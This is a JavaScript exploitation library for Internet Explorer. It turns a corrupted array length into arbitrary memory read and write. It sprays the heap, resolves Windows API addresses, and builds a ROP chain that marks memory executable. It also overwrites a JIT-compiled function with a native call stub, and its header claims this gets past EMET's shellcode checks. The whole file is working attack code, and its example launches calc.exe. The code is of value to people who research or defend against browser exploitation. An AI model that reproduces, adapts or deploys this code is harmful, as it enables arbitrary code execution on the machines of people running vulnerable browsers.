/*
*
*	@ A javacript lib for exploiting IE after corrupting an array object's length field.
*	@ It will make a call stub by overwritting binary code of a javascript jit function, 
*	  so that you can call native APIs from javascript code at anytime you want, and bypassing
*	  EMET's shellcode checking
*
*   @ Author: Yuki Chen (古河)
*	@ The array spraying technique credits @bluerust, specials thanks to him for his great sharing on array spraying technique.
*
*	@Example Usage:
*		var explib = new ExpLib( 98688, (0x1000 - 0x20)/4, 0x1a1b3000, new payload_exec('calc.exe') );
*		explib.spray();
*	
*   	// modify array length with your vulnerability
*		// for testing, use WinDbg:  "ed 1a1b3000+18  400"
*
*   	ExpLib.go();
*
*/

ExpLib = (function() {

	function ExpLib( num_arrays, arr_size, base, payload ) {
		this.arr1 = null;
		this.arr2 = null;
		this.base = base;
		this.arr_size = arr_size;
		this.arr_arr = null;

		this.payload = payload;
		this.modules = {}
		this.getproc = null;
		this.loadlibrary = null;

	}

	ExpLib.prototype.resolveAPI = function( modulename, procname ) {
		var module  = this.resolveModule( modulename );

		return this.callAPI( this.getproc, module, this.allocateString(procname) );
	}

	ExpLib.prototype.resolveModule = function( modulename ) {
		if ( this.modules[modulename] )
			return this.modules[modulename];

		var module = this.callAPI( this.loadlibrary, this.allocateString(modulename) );
		this.modules[modulename] = module;
		return module;
	}


	ExpLib.prototype.spray = function() {
		this.arr_arr = new Array( num_arrays );

		var decl = "[";

		for ( var i = 0; i < this.arr_size - 1; ++ i ) {
			decl += '0,';
		}

		decl += '0';
		decl += ']';

		for ( var i = 0; i < num_arrays; ++ i ) {
			this.arr_arr[i] = eval(decl);
			this.arr_arr[i][0] = 0x21212121;
			this.arr_arr[i][1] = 0x22222222;
			this.arr_arr[i][2] = 0x23232323;
			this.arr_arr[i][3] = 0x24242424;
		}


		//alert('finished spray');
    } 

    ExpLib.prototype.setValue = function(i1, i2, v) {
		this.arr_arr[i1][i2] = v;
	}


    ExpLib.prototype.setValueByAddr = function(index, addr, v) {
		this.arr_arr[i][((addr % 0x1000) - 0x20) / 4] = v;
	}

	

	ExpLib.prototype.read32 = function(addr) {
		if ( addr % 4 ) {
			// error
		}
				
		if ( addr >= this.arr2_member_base ) {
			return this.arr2[(addr - this.arr2_member_base)/4];
		} else {
			return this.arr2[0x40000000 - (this.arr2_member_base - addr)/4]
		}
	}

	ExpLib.prototype.write32 = function(addr, value) {
		if ( addr % 4 ) {
			// error
		}

		if ( value >= 0x80000000 )
			value = -(0x100000000 - value);

		//alert(((addr - this.arr2_member_base)/4).toString(16));
		if ( addr >= this.arr2_member_base ) {
			this.arr2[(addr - this.arr2_member_base)/4] = value;
		} else {
			this.arr2[0x40000000 - (this.arr2_member_base - addr) / 4] = value;
		}
	}
			
	ExpLib.prototype.read8 = function(addr) {
		var value = this.read32( addr  & 0xfffffffc );
		switch ( addr % 4 ) {
			case 0: return (value & 0xff);
			case 1: return ((value >> 8) & 0xff);
			case 2: return ((value >> 16) & 0xff);
			case 3: return ((value >> 24) & 0xff);
		}
				
		return 0;
	}
			
	ExpLib.prototype.write8 = function(addr, value) {
		var original_value = this.read32( addr  & 0xfffffffc );
		var new_value;
				
		switch ( addr % 4 ) {
			case 0:
				new_value = (original_value & 0xffffff00) | (value & 0xff);
				break;

			case 1:
				new_value = (original_value & 0xffff00ff) | ((value & 0xff) << 8);
				break;
			case 2:
				new_value = (original_value & 0xff00ffff) | ((value & 0xff) << 16);
				break;
			case 3:
				new_value = (original_value & 0x00ffffff) | ((value & 0xff) << 24);
				break;
		}
				
				
		this.write32( addr  & 0xfffffffc, new_value );
	}
			

	ExpLib.prototype.writeBytes = function(addr, bytes) {
		for ( var i = 0; i + 3 < bytes.length; i += 4 ) {
			var value = (bytes[i] & 0xff) | ((bytes[i+1] & 0xff) << 8) |
						((bytes[i + 2] & 0xff) << 16) | ((bytes[i + 3] & 0xff) << 24);
								
			this.write32( addr + i, value );
		}
				
		for ( ; i < bytes.length; ++ i ) {
			this.write8( addr + i, bytes[i] );
		}
	}

	ExpLib.prototype.writeString = function(addr, s) {
		var bytes = [];
		var i = 0;
		for ( ; i < s.length; ++ i ) {
			bytes[i] = s.charCodeAt(i);
		}

		bytes[i] = 0;

		this.writeBytes( addr, bytes );
	}
			
	ExpLib.prototype.read16 = function(addr) {
		if ( addr % 2 ) {
					// error, not aligned
		}
				
		var value = this.read32( addr  & 0xfffffffc );
		switch ( addr % 4 ) {
			case 0: return (value & 0xffff);
			case 1: return ((value >> 8) & 0xffff);
			case 2: return ((value >> 16) & 0xffff);
			case 3: /*not supported*/ break;
		}
				
		return 0;		
	}
			
	ExpLib.prototype.strequal = function(addr, s)  {
		for ( var i = 0; i < s.length; ++ i ) {
			if ( this.read8(addr + i) != s.charCodeAt(i) )
				return false;
		}
				
		return true;
	}
			
			
	ExpLib.prototype.getModuleBase = function(addr) {
				
		var cur_addr = addr;
				
		while ( cur_addr > 0 ) {
					
			if ( (this.read32(cur_addr) & 0xffff) == 0x5a4d ) {
				return cur_addr;
			}
					
			cur_addr -= 0x10000;
		}
				
		return 0;
	}
			
			
			
	ExpLib.prototype.getModuleBaseFromIAT = function(base, name) {
		var import_table = base + this.read32( base + this.read32(base + 0x3c) + 0x80 );
		var cur_table = import_table;
				
		while ( cur_table < import_table + 0x1000 ) {
					
			var name_addr = base + this.read32(cur_table + 12);
			if ( this.strequal( name_addr, name ) ) {
				var iat = base + this.read32(cur_table + 16);
				var func = this.read32(iat);
				while ( 0 == func ) { 
					iat += 4;
					func = this.read32(iat);
				}
						
				return this.getModuleBase( func & 0xFFFF0000 );
						
			}
					
			cur_table += 20;
		}
				
		return 0;
	}
			
	ExpLib.prototype.getProcAddress = function(base, procname)  {
		var export_table = base + this.read32( base + this.read32(base + 0x3c) + 0x78 );
		var num_functions = this.read32( export_table + 20 );
		var addr_functions = base + this.read32( export_table + 28 );
		var addr_names = base + this.read32( export_table + 32 );
		var addr_ordinals = base + this.read32( export_table + 36 );
				
		for ( var i = 0; i < num_functions; ++ i ) {
			var name_addr = this.read32( addr_names + i * 4 ) + base;
			if ( this.strequal( name_addr, procname ) ) {
				var ordinal = this.read16( addr_ordinals + i * 2 );
				var result = this.read32( addr_functions + ordinal * 4 ) + base;
				return result;
			}
		}
				
		return 0;
	}
			
	ExpLib.prototype.searchBytes = function(pattern, start, end)  {
				
		if ( start >= end || start + pattern.length > end )
			return 0;
				
		var pos = start;
		while ( pos < end ) {
			for ( var i = 0; i < pattern.length; ++ i ) {
				if ( this.read8(pos + i) != pattern[i] )
					break;
			}
					
			if ( i == pattern.length ) {
				return pos;
			}
					
			++ pos;
		}
				
		return 0;
	}


	ExpLib.prototype.getError = function(msg) {
		return this.err_msg;
	}

	ExpLib.prototype.setError = function(msg) {
		this.err_msg = msg;
	}

	ExpLib.prototype.go = function() {

		var i = 0;



		for ( ; i < this.arr_arr.length - 1; ++ i ) {
			this.arr_arr[i][this.arr_size + 0x1c / 4] = 0;

			if ( this.arr_arr[i][this.arr_size + 0x18 / 4] == this.arr_size ) {
				this.arr_arr[i][this.arr_size + 0x14 / 4] = 0x3fffffff;
				this.arr_arr[i][this.arr_size + 0x18 / 4] = 0x3fffffff;

				this.arr_arr[i + 1].length = 0x3fffffff;

				if ( this.arr_arr[i+1].length == 0x3fffffff )
					break;
			}		

		}
			
		if ( i >= this.arr_arr.length - 1 ) {
			this.setError( "Cannot find array with corrupt length!" );
			return false;
		}

		

		this.arr1_idx = i;
		this.arr2_idx = i + 1;	

		this.arr1 = this.arr_arr[i];	
		this.arr2 = this.arr_arr[i + 1];

		this.arr2_base = this.base + 0x1000;
		this.arr2_member_base = this.arr2_base + 0x20;

		var jitfunc = function(a, b) {
			return a * b + a - b;
		}

		for ( var i = 0; i < 1000; ++ i )
			jitfunc();

		var target_arr = new Array( 1, 2, 3, 4, 5 );
		this.arr_arr[this.arr2_idx + 1][0] = target_arr;
		this.arr_arr[this.arr2_idx + 1][1] = jitfunc;


		var target_arr_addr =  this.read32(this.arr2_member_base + 0x1000);
		var target_arr_vftable = this.read32(target_arr_addr);

		var jitfunc_addr = this.read32(this.read32(this.read32(this.arr2_member_base + 0x1000 + 4) + 4) + 0x0c);

		
		var modulebase = this.getModuleBase( target_arr_vftable & 0xffff0000 );
		var kernel32_base = this.getModuleBaseFromIAT( modulebase, "KERNEL32" );
		var ntdll_base = this.getModuleBaseFromIAT( kernel32_base, "ntdll" );

		this.modules['kernel32.dll'] = kernel32_base;
		this.modules['ntdll_base'] = ntdll_base;
		this.getproc = this.getProcAddress( kernel32_base, 'GetProcAddress' );
		this.loadlibrary = this.getProcAddress( kernel32_base, 'LoadLibraryA' );


		var	zwprotectvirtualmemory = this.getProcAddress( ntdll_base, "ZwProtectVirtualMemory" );

		var ntdll_code_start = ntdll_base + this.read32(ntdll_base + this.read32(ntdll_base + 0x3c) + 0x104);
		var ntdll_code_end = ntdll_base + this.read32(ntdll_base + this.read32(ntdll_base + 0x3c) + 0x108);
			

		var xchg_eax_esp = this.searchBytes( [0x94, 0xc3], ntdll_code_start, ntdll_code_end );
		var xchg_eax_edi = this.searchBytes( [0x97, 0xc3], ntdll_code_start, ntdll_code_end );
		
		
		//alert(xchg_eax_edi.toString(16));
		

		/*
		--------------------------------------------------------
		0				xchg eax, edi; ret;
		--------------------------------------------------------
		4				ZwProtectVirtualMemory
		--------------------------------------------------------
		8				ZwProtectVirtualMemory
		--------------------------------------------------------
		c               0xffffffff
		--------------------------------------------------------
		10				pjitfunc
		--------------------------------------------------------
		14				psize
		--------------------------------------------------------
		18				PAGE_EXECUTE_READWRITE
		--------------------------------------------------------
		1c				pout
		--------------------------------------------------------
		20				shellcode
		--------------------------------------------------------
		24              0xffffffff
		--------------------------------------------------------
		28				pshellcode
		--------------------------------------------------------
		2c				psize
		--------------------------------------------------------
		30				PAGE_EXECUTE_READWRITE
		--------------------------------------------------------
		34				pout
		--------------------------------------------------------
		*/


		var fake_vtable = this.arr2_base + 0x100;
		
		
		var pjitfunc = this.arr2_member_base + 8;
		var psize = this.arr2_member_base + 12;
		var pout = this.arr2_member_base + 16;
		var psc = this.arr2_member_base + 20;
		var sc_addr = this.arr2_member_base + 0x60;

		/*
		xchg edi, esp
		xor eax, eax
		inc eax
		ret 4
		*/

		var sc = [0x87, 0xfc, 0x31, 0xc0, 0x40, 0xc2, 0x04, 0x00]
		var PAGE_EXECUTE_READWRITE = 0x40;

		this.writeBytes( sc_addr, sc );
		this.write32( psc, sc_addr );


		this.write32( pjitfunc, jitfunc_addr );
		this.write32( psize, 0x1000 );
		this.write32( pout, 0 );


		this.write32( fake_vtable, xchg_eax_edi );
		this.write32( fake_vtable + 0x04, zwprotectvirtualmemory );
		this.write32( fake_vtable + 0x08, zwprotectvirtualmemory );
		this.write32( fake_vtable + 0x0c, -1 );
		this.write32( fake_vtable + 0x10, pjitfunc );
		this.write32( fake_vtable + 0x14, psize );
		this.write32( fake_vtable + 0x18, PAGE_EXECUTE_READWRITE );
		this.write32( fake_vtable + 0x1c, pout );
		this.write32( fake_vtable + 0x20, sc_addr );
		this.write32( fake_vtable + 0x24, -1 );
		this.write32( fake_vtable + 0x28, psc );
		this.write32( fake_vtable + 0x2c, psize );
		this.write32( fake_vtable + 0x30, PAGE_EXECUTE_READWRITE );
		this.write32( fake_vtable + 0x34, pout );

			

		this.write32( fake_vtable + 0x7C, xchg_eax_esp );
		
		this.write32( target_arr_addr, fake_vtable );

		if ( fake_vtable in target_arr ) {}
		
		var stub = [0x90, 0x90, 0x90, 0x68, 0x11, 0x11, 0x11, 0x11, 0x90, 0x90, 0x90, 0x68, 0x22, 0x22, 0x22, 0x22, 0x90, 0x90, 0x90, 0x68, 0x33, 0x33, 0x33, 
					0x33, 0x90, 0x90, 0x90, 0x68, 0x44, 0x44, 0x44, 0x44, 0x90, 0x90, 0x90, 0x68, 0x55, 0x55, 0x55, 0x55, 0x90, 0x90, 0x90, 0x68, 0x66, 0x66, 
					0x66, 0x66, 0x90, 0x90, 0x90, 0x68, 0x77, 0x77, 0x77, 0x77, 0x90, 0x90, 0x90, 0x68, 0x88, 0x88, 0x88, 0x88,
					0x90, 0x90, 0x90, 0x68, 0x99, 0x99, 0x99, 0x99, 0x58, 0xFF, 0xD0, 0xA3, 0xAA, 0xAA, 0xAA, 0xAA, 0x83, 0xC4, 0x28, 0x33, 0xC0, 0xC3];

		this.writeBytes( jitfunc_addr, stub );
		
		//alert( jitfunc_addr.toString(16) );


		this.locals = [this.arr2_base + 0x100, this.arr2_base + 0x200, this.arr2_base + 0x300, this.arr2_base + 0x400,
						this.arr2_base + 0x500, this.arr2_base + 0x600, this.arr2_base + 0x700, this.arr2_base + 0x800];
		this.local = 0;


		this.retval = this.locals[this.locals.length - 1] + 0x100;


		this.write32( jitfunc_addr + 0x4c, this.retval );

		this.callAPI = function(api, a1, a2, a3, a4, a5, a6, a7, a8) {
			this.write32( jitfunc_addr + 0x3c, a1 == undefined? 0 : a1 );
			this.write32( jitfunc_addr + 0x34, a2 == undefined? 0 : a2 );
			this.write32( jitfunc_addr + 0x2c, a3 == undefined? 0 : a3 );
			this.write32( jitfunc_addr + 0x24, a4 == undefined? 0 : a4 );
			this.write32( jitfunc_addr + 0x1c, a5 == undefined? 0 : a5 );
			this.write32( jitfunc_addr + 0x14, a6 == undefined? 0 : a6 );
			this.write32( jitfunc_addr + 0x0c, a7 == undefined? 0 : a7 );
			this.write32( jitfunc_addr + 0x04, a8 == undefined? 0 : a8 );

			this.write32( jitfunc_addr + 0x44, api );

			this.write8( jitfunc_addr + 0x52, (32 - (arguments.length - 1) * 4) );

			jitfunc();

			this.local = 0;

			return this.read32( this.retval );

		}

		this.allocateString = function(s) {
			if ( this.local >= this.locals.length )
				return 0;

			var str = this.locals[this.local ++];
			this.writeString( str, s );

			return str;

		}
	
	
		this.payload.execute( this );


		return true;

	}



	

	return ExpLib;

})();
